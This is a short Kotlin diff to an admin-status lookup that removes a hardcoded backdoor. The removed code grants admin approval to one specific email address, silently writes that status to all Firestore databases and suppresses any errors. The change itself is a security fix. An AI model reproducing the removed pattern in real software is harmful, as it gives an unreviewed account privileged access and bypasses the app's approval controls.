@@ -473,17 +473,6 @@ actual suspend fun getAdminStatusFromFirestore(email: String): AdminStatus {
                 }
             } catch (_: Exception) {}
         }
-
-        if (cleanEmail == "mdrofiqmpi@gmail.com") {
-            try {
-                val fixData = mapOf("status" to "APPROVED")
-                for ((db, _) in getFirestoreInstances()) {
-                    db.collection("admins").document("mdrofiqmpi@gmail.com").set(fixData, SetOptions.merge())
-                }
-            } catch (_: Exception) {}
-            return@withTimeoutOrNull AdminStatus.APPROVED
-        }
-
         AdminStatus.NOT_REQUESTED
     }
 
